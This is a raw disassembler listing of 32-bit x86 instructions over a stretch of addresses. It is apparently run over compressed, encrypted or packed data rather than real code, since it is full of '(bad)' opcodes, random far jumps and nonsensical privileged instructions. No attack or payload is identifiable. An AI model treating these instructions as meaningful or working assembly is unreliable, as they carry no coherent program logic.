  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	mov    dh,0x43
  416d8e:	dec    esi
  416d8f:	in     al,dx
  416d90:	adc    eax,0xad28467a
  416d95:	(bad)  
  416d97:	stos   DWORD PTR es:[edi],eax
  416d98:	scas   eax,DWORD PTR es:[edi]
  416d99:	dec    edx
  416d9a:	xchg   ebp,eax
  416d9b:	adc    eax,0x475182dc
  416da0:	pop    ecx
  416da1:	aad    0x4f
  416da3:	sbb    al,0xf6
  416da5:	js     0x416d46
  416da7:	adc    DWORD PTR [ecx+0x4a],eax
  416daa:	sahf   
  416dab:	lods   eax,DWORD PTR ds:[esi]
  416dac:	mov    eax,ds:0x8efd3969
  416db1:	dec    esp
  416db2:	pop    ds
  416db3:	jns    0x416d6d
  416db5:	pushf  
  416db6:	sbb    eax,0xdff39964
  416dbb:	xor    ah,BYTE PTR [esi+0x4d531339]
  416dc1:	outs   dx,DWORD PTR ds:[esi]
  416dc2:	mov    ah,0x45
  416dc4:	hlt    
  416dc5:	mov    cl,BYTE PTR [ecx+0xb]
  416dc8:	mov    al,0x56
  416dca:	test   al,0x3
  416dcc:	jae    0x416d8d
  416dce:	(bad)  
  416dcf:	dec    esi
  416dd0:	inc    edx
  416dd1:	add    ah,ch
  416dd3:	ror    BYTE PTR [ebx+0x77512f7b],1
  416dd9:	or     bl,BYTE PTR [edx]
  416ddb:	sti    
  416ddc:	lea    ebx,[esi-0x5f9b63cb]
  416de2:	xor    al,0x65
  416de4:	mov    ds:0x7262b0a5,eax
  416de9:	pushf  
  416dea:	lds    esi,FWORD PTR [edi]
  416dec:	cmp    eax,0x54cd7bde
  416df1:	aam    0xb0
  416df3:	mov    al,BYTE PTR [esi]
  416df5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  416df7:	iret   
  416df8:	mov    esi,0x21f3dcc2
  416dfd:	add    ebx,DWORD PTR [ebx-0x6f937f02]
  416e03:	ror    edx,cl
  416e05:	jnp    0x416d98
  416e07:	push   esi
  416e08:	out    0x57,al
  416e0a:	pop    esp
  416e0b:	adc    dl,BYTE PTR [edx-0x6840f551]
  416e11:	xor    al,0x9e
  416e13:	in     al,0x3b
  416e15:	pop    esi
  416e16:	xchg   edx,eax
  416e17:	(bad)  
  416e18:	popa   
  416e19:	setp   BYTE PTR [esi-0x5f]
  416e1d:	es repz jle 0x416e3a
  416e21:	push   edx
  416e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e23:	inc    ebx
  416e24:	sahf   
  416e25:	jle    0x416e46
  416e27:	xor    bh,cl
  416e29:	pop    ecx
  416e2a:	xlat   BYTE PTR ds:[ebx]
  416e2b:	push   ecx
  416e2c:	adc    ah,al
  416e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e2f:	aad    0xa4
  416e31:	pop    edi
  416e32:	in     eax,0x9a
  416e34:	outs   dx,BYTE PTR ds:[esi]
  416e35:	push   ebp
  416e36:	arpl   WORD PTR [esp+ebx*4+0x23],si
  416e3a:	adc    eax,DWORD PTR [edx+0x26bf557f]
  416e40:	cmp    eax,0x8b097e12
  416e45:	xor    eax,0xe5be7485
  416e4a:	jnp    0x416e85
  416e4c:	jns    0x416e49
  416e4e:	add    eax,edx
  416e50:	push   edx
  416e51:	push   ebp
  416e52:	in     eax,dx
  416e53:	xchg   ecx,eax
  416e54:	jge    0x416e0f
  416e56:	push   ss
  416e57:	fcmovnb st,st(1)
  416e59:	imul   esp,DWORD PTR [eax+0x24],0xbcd0bc9
  416e60:	aas    
  416e61:	xchg   ebx,eax
  416e62:	scas   eax,DWORD PTR es:[edi]
  416e63:	push   ebp
  416e64:	or     eax,0x19643ffd
  416e69:	hlt    
  416e6a:	(bad)  
  416e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e6c:	jae    0x416ec6
  416e6e:	(bad)  
  416e6f:	push   0xffffffd0
  416e71:	mov    dh,0x56
  416e73:	loope  0x416ea5
  416e75:	inc    ebp
  416e76:	repz je 0x416ef4
  416e79:	mov    al,ds:0x6d821fb0
  416e7e:	stos   BYTE PTR es:[edi],al
  416e7f:	jb     0x416e1d
  416e81:	or     esi,ebx
  416e83:	(bad)  
  416e84:	clc    
  416e85:	stc    
  416e86:	fisttp WORD PTR [ebp-0x5af4a4b]
  416e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e8d:	push   0xd826
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x7a2f8eea
  416f02:	ds jge 0x416f61
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	push   esi
  416f0d:	ret    
  416f0e:	fwait
  416f0f:	push   ebp
  416f10:	push   ds
  416f11:	sub    eax,0xc6e196a0
  416f16:	or     al,0x43
  416f18:	mov    ebp,0x38fe848d
  416f1d:	and    DWORD PTR [ebx+edi*1-0x756312b6],eax
  416f24:	pop    ebx
  416f25:	inc    DWORD PTR [edx+0x13f5bb2c]
  416f2b:	into   
  416f2c:	or     edx,DWORD PTR [edi+0x1d04734d]
  416f32:	jg     0x416f6c
  416f34:	clc    
  416f35:	jmp    0x416f5e
  416f37:	cmp    ah,cl
  416f39:	ret    
  416f3a:	mov    esi,0x97317d5f
  416f3f:	mov    al,0xf5
  416f41:	cmp    al,BYTE PTR [ebx+ebx*1+0x2d2485e4]
  416f48:	dec    ebx
  416f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f4a:	popa   
  416f4b:	stc    
  416f4c:	outs   dx,DWORD PTR ds:[esi]
  416f4d:	fwait
  416f4e:	cmp    ebx,DWORD PTR [esi-0x18]
  416f51:	ins    DWORD PTR es:[edi],dx
  416f52:	test   cl,dh
  416f54:	xlat   BYTE PTR ds:[ebx]
  416f55:	adc    eax,0x2aab4e20
  416f5a:	sub    cl,BYTE PTR [ecx-0x90b9e55]
  416f60:	shr    bl,0x6a
  416f63:	es fcmovbe st,st(4)
  416f66:	out    dx,eax
  416f67:	fisttp WORD PTR [edx]
  416f69:	pop    ebx
  416f6a:	or     eax,0x5868f360
  416f6f:	push   esi
  416f70:	outs   dx,DWORD PTR ds:[esi]
  416f71:	ss adc edx,ebx
  416f74:	sub    al,0xb6
  416f76:	xor    edi,DWORD PTR [esi]
  416f78:	or     al,0x34
  416f7a:	fidiv  WORD PTR [edi-0x74a45e00]
  416f80:	popf   
  416f81:	mov    ebx,0xc056c5e5
  416f86:	dec    ebp
  416f87:	jns    0x416fe6
  416f89:	xlat   BYTE PTR ds:[ebx]
  416f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f8b:	aaa    
  416f8c:	pusha  
  416f8d:	mov    cl,0x9c
  416f8f:	in     al,dx
  416f90:	or     ebx,ebp
  416f92:	scas   al,BYTE PTR es:[edi]
  416f93:	jg     0x416f43
  416f95:	ja     0x416f6f
  416f97:	mov    bh,0x2
  416f99:	fwait
  416f9a:	jbe    0x416f70
  416f9c:	mov    esp,0x6a43ebea
  416fa1:	shr    BYTE PTR [ebx-0x297e5fbb],cl
  416fa7:	test   DWORD PTR [ecx+0x21c380a],esp
  416fad:	bswap  eax
  416faf:	pop    eax
  416fb0:	sbb    al,0x14
  416fb2:	jbe    0x416ffd
  416fb4:	dec    ebx
  416fb5:	(bad)  
  416fb6:	jns    0x417016
  416fb8:	xchg   edi,eax
  416fb9:	add    DWORD PTR [ebx-0x3c],edx
  416fbc:	sub    BYTE PTR [ecx+0x24],ah
  416fbf:	pop    DWORD PTR [esi-0x6e]
  416fc2:	push   0xfffffff4
  416fc4:	sub    al,0xfe
  416fc6:	test   al,0x25
  416fc8:	inc    ebx
  416fc9:	jmp    0x62bb:0xeeb37d0c
  416fd0:	and    al,0x1c
  416fd2:	cmc    
  416fd3:	xor    al,0x5d
  416fd5:	add    al,0x56
  416fd7:	mov    ds:0xcfbeb6d3,al
  416fdc:	jecxz  0x41701b
  416fde:	jb     0x416fde
  416fe0:	cdq    
  416fe1:	jae    0x416ffa
  416fe3:	sub    BYTE PTR [esi+esi*8-0x585fa53a],al
  416fea:	shl    esp,0xb
  416fed:	or     BYTE PTR [ebx+0x6dca3052],0xcb
  416ff4:	retf   0x944d
  416ff7:	fild   WORD PTR [edi+edx*2-0x1cfabe6c]
  416ffe:	mov    al,0x4c
  417000:	aam    0xc0
  417002:	or     al,0xf2
  417004:	pop    eax
  417006:	xchg   DWORD PTR [ecx+0x5f],ebp
  417009:	ss mov edi,0xa5c6eb3a
  41700f:	xor    eax,DWORD PTR [eax]
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [esi+ebx*4]
  417082:	sub    al,0x8d
  417084:	pusha  
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	mov    eax,ds:0x8d9a060b
  417091:	add    DWORD PTR [edx+0x8beccbf],0x4c
  417098:	sub    ch,bh
  41709a:	es gs aas 
  41709d:	test   BYTE PTR [ebx+ebp*8-0x3154aafb],bh
  4170a4:	jae    0x4170aa
  4170a6:	inc    edi
  4170a7:	cli    
  4170a8:	into   
  4170a9:	adc    al,0x1e
  4170ab:	sysexit 
  4170ad:	cs pop eax
  4170af:	test   eax,0x827fd14a
  4170b4:	mov    esp,0x3b250f47
  4170b9:	xor    ebp,DWORD PTR [edx]
  4170bb:	stos   BYTE PTR es:[edi],al
  4170bc:	cwde   
  4170bd:	push   ebp
  4170be:	nop
  4170bf:	push   es
  4170c0:	sbb    edi,0xec09897
  4170c6:	(bad)  
  4170c8:	inc    edi
  4170c9:	imul   esp,DWORD PTR [ebp+0x50],0x28e4dac6
  4170d0:	xchg   DWORD PTR [ebx+0x50],esp
  4170d3:	xchg   edi,eax
  4170d4:	xor    ebx,esp
  4170d6:	mov    bh,ch
  4170d8:	ficom  WORD PTR [eax]
  4170da:	(bad)  
  4170db:	lock push eax
  4170dd:	xor    eax,0x16749d28
  4170e2:	out    0x76,al
  4170e4:	push   DWORD PTR [edx-0x5f9fadbe]
  4170ea:	jo     0x4170e0
  4170ec:	jmp    0x132b6e32
  4170f1:	jecxz  0x4170c0
  4170f3:	push   0xdb878221
  4170f8:	mov    fs,WORD PTR [ebx]
  4170fa:	pop    esi
  4170fb:	xchg   BYTE PTR [edi],bl
  4170fd:	scas   eax,DWORD PTR es:[edi]
  4170fe:	adc    al,0x82
  417100:	cs xchg ebx,eax
  417102:	imul   ebx,DWORD PTR ds:0x44c6984c,0xffffffb2
  417109:	ja     0x4170e1
  41710b:	mov    ss,ebx
  41710d:	loope  0x4170ba
  41710f:	test   al,0x8e
  417111:	ret    0x5ea8
  417114:	sbb    edi,DWORD PTR [eax]
  417116:	fld    DWORD PTR [edx]
  417118:	mov    cl,0x64
  41711a:	leave  
  41711b:	or     al,0x32
  41711d:	xchg   esi,eax
  41711e:	aam    0xb1
  417120:	xor    ecx,DWORD PTR [edx+eax*4]
  417123:	mov    dl,0xd
  417125:	cmp    BYTE PTR [eax-0x5b3bfa6e],al
  41712b:	stos   DWORD PTR es:[edi],eax
  41712c:	call   0x7d4f:0x1b9db604
  417133:	sbb    ch,BYTE PTR [edi]
  417135:	mov    esi,0xabc1d5bc
  41713a:	push   ecx
  41713b:	(bad)  
  41713c:	cs push es
  41713e:	mov    bl,0xf6
  417140:	out    0x43,eax
  417142:	sub    BYTE PTR [ebp-0x33706c6b],cl
  417148:	sbb    eax,0x14d2187a
  41714d:	push   ds
  41714e:	imul   edi,esp,0xffffff9e
  417151:	test   BYTE PTR [edx-0x648a96f6],bh
  417157:	push   edx
  417158:	mov    dl,0x2
  41715a:	or     eax,0x797bdf47
  41715f:	call   0x56a61be8
  417164:	mov    cl,0xe
  417166:	fwait
  417167:	xor    eax,0x265d4cf
  41716c:	adc    ax,0xe856
  417170:	aaa    
  417171:	nop
  417172:	scas   eax,DWORD PTR es:[edi]
  417173:	inc    ecx
  417174:	xor    BYTE PTR [ebx],0xf7
  417177:	or     eax,0x44165cea
  41717c:	push   es
  41717d:	and    al,0xcf
  41717f:	and    esp,DWORD PTR [ebx+0x58]
  417182:	pop    esi
  417183:	cmc    
  417184:	popf   
  417185:	sbb    al,BYTE PTR [ebx-0x29b71050]
  41718b:	pop    ecx
  41718c:	dec    esi
  41718d:	adc    BYTE PTR [esi],bl
  41718f:	popa   
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	jnp    0x4171fc
  417202:	jecxz  0x41725d
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	and    al,0xb1
  41720e:	lods   eax,DWORD PTR ds:[esi]
  41720f:	pop    edx
  417210:	les    ebp,FWORD PTR [ebx]
  417212:	xor    eax,DWORD PTR [ebx+0x7c]
  417215:	xchg   ecx,eax
  417216:	or     al,0xb5
  417218:	cli    
  417219:	and    DWORD PTR [ebp+0x6f],ebp
  41721c:	cmp    ch,BYTE PTR [ebx+0x3962cbeb]
  417222:	int3   
  417223:	mov    dh,0x48
  417225:	cli    
  417226:	(bad)  [esi+0x4e]
  417229:	mov    cl,0x95
  41722b:	sub    al,0x56
  41722d:	inc    eax
  41722e:	inc    esi
  41722f:	pop    edi
  417230:	pop    ss
  417231:	fld    TBYTE PTR [edx+0x6]
  417234:	test   al,0x5d
  417236:	mov    ah,0x97
  417238:	mov    ecx,0x69d1081
  41723d:	ror    edi,1
  41723f:	popa   
  417240:	out    0xdc,al
  417242:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417244:	out    0xe6,al
  417246:	xchg   edi,eax
  417247:	push   ds
  417248:	enter  0xc43d,0x25
  41724c:	sub    DWORD PTR [ecx],ebp
  41724e:	push   ss
  41724f:	jo     0x417215
  417251:	xor    edi,esp
  417253:	dec    edx
  417254:	leave  
  417255:	pushf  
  417256:	mov    al,ds:0xf3ec682b
  41725b:	jl     0x417274
  41725d:	fidivr DWORD PTR [ebx]
  41725f:	das    
  417260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417261:	push   0x43
  417263:	or     edi,edi
  417265:	cmc    
  417266:	scas   al,BYTE PTR es:[edi]
  417267:	pop    edx
  417268:	sahf   
  417269:	addr16 pop edx
  41726b:	addr16 push ecx
  41726d:	sti    
  41726e:	jg     0x417248
  417270:	imul   esi,edx,0x1d
  417273:	enter  0x2877,0x91
  417277:	fsub   QWORD PTR [esi]
  417279:	mov    DWORD PTR [edx],ebx
  41727b:	test   esp,eax
  41727d:	cmp    edi,0x6db64516
  417283:	mov    ah,0x1
  417285:	mov    ebp,0xa4ec7fd5
  41728a:	mov    eax,ds:0xcb5109c4
  41728f:	arpl   si,bp
  417291:	sbb    BYTE PTR [eax-0x1a],cl
  417294:	lds    esp,FWORD PTR [edx]
  417296:	mov    cl,0x2c
  417298:	jmp    0x4172bf
  41729a:	pusha  
  41729b:	push   es
  41729c:	data16 and bx,WORD PTR [edx]
  4172a0:	xchg   esp,eax
  4172a1:	repnz and eax,0x3cd3be61
  4172a7:	sbb    al,0x59
  4172a9:	loope  0x417314
  4172ab:	dec    edi
  4172ac:	mov    al,0x80
  4172ae:	aas    
  4172af:	test   cl,bl
  4172b1:	fisttp DWORD PTR [eax+0x1f]
  4172b4:	pop    ds
  4172b5:	sub    al,ah
  4172b7:	sbb    al,0x1d
  4172b9:	retf   0x354d
  4172bc:	or     ah,BYTE PTR [ecx+ebx*8-0x2baf9687]
  4172c3:	mov    al,0x85
  4172c5:	push   ebx
  4172c6:	mov    esp,edi
  4172c8:	fcmovne st,st(5)
  4172ca:	in     eax,dx
  4172cb:	jb     0x4172a3
  4172cd:	mov    WORD PTR [eax],ds
  4172cf:	sub    eax,0xf5a70ab2
  4172d4:	popa   
  4172d5:	ror    DWORD PTR [eax+ebp*8-0x6b18ea91],0x47
  4172dd:	gs das 
  4172df:	xchg   edi,eax
  4172e0:	jg     0x417302
  4172e2:	push   0xcb935e7
  4172e7:	fwait
  4172e8:	call   FWORD PTR [edx+0x2e0d88c8]
  4172ee:	and    BYTE PTR [edx+edi*1+0x5c],0x53
  4172f3:	jno    0x4172a9
  4172f5:	pop    es
  4172f6:	dec    esp
  4172f7:	leave  
  4172f8:	adc    ch,BYTE PTR [ecx+0xe]
  4172fb:	int3   
  4172fc:	es cmc 
  4172fe:	hlt    
  4172ff:	pop    eax
  417300:	pop    ebx
  417301:	jno    0x417339
  417303:	(bad)
  417306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417307:	int    0xa3
  417309:	sbb    al,0xf9
  41730b:	and    al,0x69
  41730d:	into   
  41730e:	dec    ebp
  41730f:	inc    esi
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs aas 
  417381:	ror    ebx,0xbd
  417384:	push   0x40000f5
  417389:	add    DWORD PTR [eax],eax
  41738b:	add    BYTE PTR ds:0x17eb100b,ch
  417391:	mov    eax,ds:0x67ad2676
  417396:	lock cs icebp 
  417399:	xchg   esi,eax
  41739a:	cmp    al,0x9a
  41739c:	addr16 jno 0x417327
  41739f:	cmp    eax,0xd74fce29
  4173a4:	es jb  0x4173b6
  4173a7:	mov    eax,0xe158f470
  4173ac:	xor    BYTE PTR [edi+0x5db69375],0xde
  4173b3:	cmp    eax,0xeec999cb
  4173b8:	arpl   WORD PTR ds:0x30424fe6,bx
  4173be:	jbe    0x4173d9
  4173c0:	jbe    0x4173ee
  4173c2:	inc    eax
  4173c3:	xchg   DWORD PTR [ebx],ebp
  4173c5:	data16 lahf 
  4173c7:	adc    eax,esp
  4173c9:	jno    0x4173d4
  4173cb:	xchg   ecx,eax
  4173cc:	mov    DWORD PTR [ecx],ecx
  4173ce:	inc    esp
  4173cf:	and    edi,DWORD PTR [eax-0x7b]
  4173d2:	cli    
  4173d3:	fimul  DWORD PTR [esi+0x33f24802]
  4173d9:	add    al,0xa9
  4173db:	cld    
  4173dc:	fs in  eax,0xac
  4173df:	cld    
  4173e0:	add    esi,DWORD PTR [ebx+0x13]
  4173e3:	aam    0xaa
  4173e5:	sti    
  4173e6:	xor    BYTE PTR [eax-0x4f],dh
  4173e9:	pop    edx
  4173ea:	pop    ss
  4173eb:	inc    esp
  4173ec:	sub    al,0xb0
  4173ee:	add    eax,DWORD PTR [edx+0x3b]
  4173f1:	fmul   DWORD PTR [esi]
  4173f3:	loop   0x4173f3
  4173f5:	mov    ds:0x1b361edf,al
  4173fa:	adc    al,0xd8
  4173fc:	mov    eax,ds:0x4e4fd1ce
  417401:	clc    
  417402:	cmp    DWORD PTR [ecx+0x4464fd7c],edi
  417408:	or     al,0xae
  41740a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41740b:	pmulhw mm0,QWORD PTR [eax]
  41740e:	xor    BYTE PTR [ebp-0xb],ah
  417411:	sub    ah,BYTE PTR [edx+0x3f]
  417414:	push   ds
  417415:	xlat   BYTE PTR ds:[ebx]
  417416:	mov    ebp,0x754cb674
  41741b:	into   
  41741c:	fidiv  WORD PTR [esi+0x1e5df0a9]
  417422:	pop    ebx
  417423:	inc    eax
  417424:	dec    ebx
  417425:	push   eax
  417426:	jle    0x4173e2
  417428:	imul   edx,eax,0x34
  41742b:	mov    bh,0x73
  41742d:	in     al,0xb4
  41742f:	dec    ebx
  417430:	retf   
  417431:	fmulp  st(1),st
  417433:	test   eax,0x6725d461
  417438:	pop    edi
  417439:	js     0x417475
  41743b:	retf   
  41743c:	ret    
  41743d:	test   BYTE PTR [ecx],dh
  41743f:	sbb    al,0x44
  417441:	adc    eax,0x7842b36d
  417446:	cwde   
  417447:	and    eax,0x509d07ed
  41744c:	adc    eax,ecx
  41744e:	nop
  41744f:	idiv   BYTE PTR [ebx]
  417451:	out    dx,eax
  417452:	loope  0x4174c5
  417454:	nop
  417455:	(bad)  
  417456:	dec    ebx
  417457:	fbld   TBYTE PTR [eax+0x558e95b3]
  41745d:	std    
  41745e:	in     eax,dx
  41745f:	adc    ah,BYTE PTR [ebx+0x30]
  417462:	mov    ?,WORD PTR [eax+ebp*2+0x62]
  417466:	add    eax,0xe4e311a2
  41746b:	in     al,dx
  41746c:	retf   
  41746d:	es mov eax,0x17ba0a94
  417473:	js     0x4174da
  417475:	mov    cl,0xb
  417477:	sub    esi,DWORD PTR [edx-0x311596db]
  41747d:	dec    ecx
  41747e:	imul   ecx,DWORD PTR [eax+0x5ae0c0df],0xc131b112
  417488:	adc    al,0xcf
  41748a:	push   edx
  41748b:	ins    BYTE PTR es:[edi],dx
  41748c:	xchg   esi,eax
  41748d:	ds or  ebp,eax
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	jge    0x417485
  417502:	cdq    
  417503:	hlt    
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	shr    dl,cl
  41750e:	inc    esp
  41750f:	xchg   edx,eax
  417510:	sahf   
  417511:	int    0xdd
  417513:	pop    edx
  417514:	or     BYTE PTR [ecx+0x2cc16f69],cl
  41751a:	mov    WORD PTR [eax+0x3fc44849],?
  417520:	push   esp
  417521:	inc    eax
  417522:	mov    al,ds:0xdaebd1fb
  417527:	(bad)  
  417528:	adc    al,0x3f
  41752a:	dec    esp
  41752b:	push   ebx
  41752c:	inc    eax
  41752d:	(bad)  
  41752e:	out    0xbb,al
  417530:	jne    0x4174fd
  417532:	fs push cs
  417534:	mov    eax,0xa322ea07
  417539:	cdq    
  41753a:	rcr    BYTE PTR [edi+0x441079fe],0x3c
  417541:	xchg   edi,eax
  417542:	loopne 0x417528
  417544:	mov    esp,0x66b6810f
  417549:	push   eax
  41754a:	in     al,dx
  41754b:	sub    BYTE PTR [ebx+0x55],ch
  41754e:	or     edx,esp
  417550:	sub    al,0xc
  417552:	mov    esp,0xdd5807a2
  417557:	test   al,0x75
  417559:	and    DWORD PTR [eax],edi
  41755b:	jns    0x417523
  41755d:	jp     0x417560
  41755f:	inc    ebp
  417560:	lock or bl,bl
  417563:	push   0x89e22286
  417568:	(bad)  
  417569:	cld    
  41756a:	imul   ebp,DWORD PTR [ecx+ebp*1],0x41477180
  417571:	push   edi
  417572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417573:	pop    es
  417574:	sub    DWORD PTR [eax-0x42],ebx
  417577:	inc    edi
  417578:	xchg   edi,eax
  417579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41757a:	sub    eax,esp
  41757c:	add    DWORD PTR [ebp-0x4ae528ae],ebx
  417582:	jmp    0x4175c4
  417584:	jmp    0x1fa2:0x1279c931
  41758b:	pop    ebp
  41758c:	inc    ecx
  41758d:	pop    ss
  41758e:	lods   al,BYTE PTR ds:[esi]
  41758f:	add    dh,ah
  417591:	sub    edi,esi
  417593:	mov    dl,BYTE PTR [esi+0x100f94b3]
  417599:	push   es
  41759a:	out    0x6f,al
  41759c:	inc    eax
  41759d:	lock fsubr QWORD PTR [esi+ebp*8]
  4175a1:	sbb    ebp,DWORD PTR [eax]
  4175a3:	scas   eax,DWORD PTR es:[edi]
  4175a4:	dec    esi
  4175a5:	dec    ebp
  4175a7:	test   eax,0x4ea1c34c
  4175ac:	pop    ss
  4175ad:	add    BYTE PTR [esp+edi*2+0x70463a95],0xaf
  4175b5:	inc    edi
  4175b6:	fstp   DWORD PTR [edx+0x5d]
  4175b9:	inc    esi
  4175ba:	jo     0x417558
  4175bc:	mov    ds:0xec4a562f,al
  4175c1:	(bad)  
  4175c2:	jg     0x4175fe
  4175c4:	add    ch,BYTE PTR [edi-0x64546936]
  4175ca:	jnp    0x4175a4
  4175cc:	mov    ebp,0x616bb014
  4175d1:	adc    bl,ah
  4175d3:	push   0x1b4d5cbd
  4175d8:	cmp    al,0xfc
  4175da:	mov    edx,0xcafdcba2
  4175df:	dec    esi
  4175e0:	cmp    al,0xeb
  4175e2:	inc    ebp
  4175e3:	cmc    
  4175e4:	pushf  
  4175e5:	mov    edx,0x5be74321
  4175ea:	mov    ch,0xc9
  4175ec:	fmulp  st(0),st
  4175ee:	push   ebx
  4175ef:	sub    bl,BYTE PTR [edx+0x37095973]
  4175f5:	dec    ebx
  4175f6:	lahf   
  4175f7:	aad    0xe7
  4175f9:	ds in  al,dx
  4175fb:	addr16 jge 0x417626
  4175fe:	test   DWORD PTR [edx+0x3ce8a309],eax
  417604:	or     bl,BYTE PTR ds:0x8365a4d0
  41760a:	jbe    0x417595
  41760c:	repz push ebp
  41760e:	sbb    al,0xec
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficom  DWORD PTR [edi+0x7013fc19]
  417685:	test   DWORD PTR [eax],0x10400
  41768b:	add    BYTE PTR [ebp-0x4f],bh
  41768e:	push   0x76
  417690:	shl    DWORD PTR [edx-0x4f9ddbdb],cl
  417696:	push   0xffffff9f
  417698:	xor    BYTE PTR [eax-0x33270f3f],bh
  41769e:	mov    WORD PTR [eax],?
  4176a0:	call   0xf50c:0x8d39946c
  4176a7:	in     eax,dx
  4176a8:	add    al,0x56
  4176aa:	nop
  4176ab:	pop    ss
  4176ac:	call   0x9596:0x7d8b8d8a
  4176b3:	mov    eax,0x6b40fe29
  4176b8:	add    eax,0x35df693e
  4176bd:	sub    al,BYTE PTR [eax+esi*8-0x93d8ee3]
  4176c4:	ins    DWORD PTR es:[edi],dx
  4176c5:	pop    es
  4176c6:	pop    eax
  4176c7:	adc    BYTE PTR [eax+0x1d],dh
  4176ca:	inc    ecx
  4176cb:	mov    al,ds:0xf080db15
  4176d0:	(bad)  
  4176d1:	lods   al,BYTE PTR ds:[esi]
  4176d2:	xorps  xmm4,XMMWORD PTR [edx-0x12]
  4176d6:	pop    ecx
  4176d7:	fidiv  DWORD PTR [esi-0x46]
  4176da:	xor    DWORD PTR [edi],esi
  4176dc:	mov    BYTE PTR [edx],ch
  4176de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176df:	mov    dh,0xb1
  4176e1:	sub    eax,0x74eadd1
  4176e6:	ins    DWORD PTR es:[edi],dx
  4176e7:	mov    esi,0xe8aadeaa
  4176ec:	sub    eax,0x3148516f
  4176f1:	cmp    al,0x9
  4176f3:	xchg   esp,eax
  4176f4:	fcomp  DWORD PTR [esi]
  4176f6:	(bad)  
  4176f7:	xor    bl,BYTE PTR [edi+esi*4+0x20]
  4176fb:	scas   eax,DWORD PTR es:[edi]
  4176fc:	xchg   esi,eax
  4176fd:	mov    esi,0x27755ee1
  417702:	es xlat BYTE PTR cs:[ebx]
  417705:	inc    edx
  417706:	and    eax,0x22bf5396
  41770b:	push   cs
  41770c:	jp     0x41777a
  41770e:	in     eax,0x46
  417710:	repnz lods eax,DWORD PTR ds:[esi]
  417712:	or     eax,esp
  417714:	stc    
  417715:	push   0x48
  417717:	dec    ebp
  417718:	sahf   
  417719:	push   ebx
  41771a:	mov    cl,0xc0
  41771c:	push   cs
  41771d:	push   0xb37ad67d
  417722:	sub    cl,al
  417724:	arpl   WORD PTR [ebx-0x6c],dx
  417727:	add    BYTE PTR [esi],ah
  417729:	push   0xc3afd7ba
  41772e:	jle    0x417719
  417730:	mov    BYTE PTR [edx-0x8593b90],dl
  417736:	mov    al,ds:0x64559d0e
  41773b:	sbb    eax,0x98119df7
  417740:	mov    ?,esi
  417742:	xchg   esp,eax
  417743:	call   0xc9:0xf30fc00e
  41774a:	jmp    0xac7d:0xde51494e
  417751:	and    eax,0xf65d1cb9
  417756:	push   ss
  417757:	pop    ebp
  417758:	(bad)  
  417759:	nop
  41775a:	sub    al,0x91
  41775c:	int    0xe5
  41775e:	scas   al,BYTE PTR es:[edi]
  41775f:	lds    edx,FWORD PTR [ebx]
  417761:	jle    0x417786
  417763:	or     eax,0xc83750bf
  417768:	jbe    0x417716
  41776a:	add    al,0xca
  41776c:	cdq    
  41776d:	push   eax
  41776e:	cmp    al,0x7c
  417770:	or     BYTE PTR [esi],al
  417772:	adc    bl,BYTE PTR [ebx+0x21f8d063]
  417778:	dec    esp
  417779:	adc    eax,0x4de39763
  41777e:	pop    ss
  41777f:	xchg   edi,eax
  417780:	ins    DWORD PTR es:[edi],dx
  417781:	sbb    dl,dl
  417783:	or     DWORD PTR [edx+ebx*1],0xa2fa8ab7
  41778a:	push   esi
  41778b:	jno    0x417726
  41778d:	gs jp  0x4177d8
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	test   al,0x8e
  417802:	and    ah,dl
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	(bad)  [ebx]
  41780e:	gs leave 
  417810:	(bad)  
  417811:	scas   al,BYTE PTR es:[edi]
  417812:	pop    esp
  417813:	pop    edi
  417814:	in     eax,dx
  417815:	mov    edx,0xd8c1dd04
